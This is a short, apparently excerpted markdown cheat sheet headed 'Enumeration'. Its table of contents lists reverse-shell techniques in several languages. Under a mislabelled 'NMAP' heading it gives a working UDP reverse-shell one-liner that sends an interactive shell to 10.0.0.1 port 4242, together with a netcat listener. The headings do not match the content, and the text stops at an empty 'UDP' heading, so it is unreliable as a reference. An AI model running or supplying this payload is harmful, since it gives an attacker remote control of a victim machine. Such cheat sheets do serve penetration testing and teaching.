# Enumeration

## Summary
* [Reverse Shell](#reverse-shell)
    * [Bash TCP](#bash-tcp)
    * [Bash UDP](#bash-udp)
    * [Socat](#socat)
    * [Perl](#perl)
    * [Python](#python)
    * [PHP](#php)
    * [Ruby](#ruby)
    * [Golang](#golang)


### NMAP

```bash
Victim:
sh -i >& /dev/udp/10.0.0.1/4242 0>&1

Listener:
nc -u -lvp 4242
```
### UDP
